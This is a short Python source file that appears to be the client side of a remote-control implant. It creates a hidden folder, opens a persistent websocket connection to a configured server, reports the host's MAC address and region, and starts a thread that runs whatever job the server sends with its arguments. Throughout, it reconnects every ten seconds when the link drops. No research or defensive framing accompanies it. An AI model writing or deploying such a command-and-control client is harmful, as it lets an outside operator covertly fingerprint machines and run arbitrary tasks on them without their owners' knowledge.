import json
import websockets
import asyncio
import threading

from getmac import get_mac_address
from cnf import link, region, store, create_hidden_folder
from comppilator import run

create_hidden_folder(store)

    
async def listen_server(url):
    while True:
        try:
            async with websockets.connect(url) as websocket:
                await websocket.send(json.dumps({
                    "mac": get_mac_address(),
                    "region": region
                  }))
                while True:
                    data = json.loads(await websocket.recv())
                    data = json.loads(data)

                    print(data)

                    if data.get("run"):
                        thread = threading.Thread(target=run, args=(data["args"],))
                        thread.start()
        except Exception as e:
            print(e)
            await asyncio.sleep(10)

if __name__ == '__main__':
    asyncio.run(listen_server(f'{link.replace("http", "ws")}ws'))
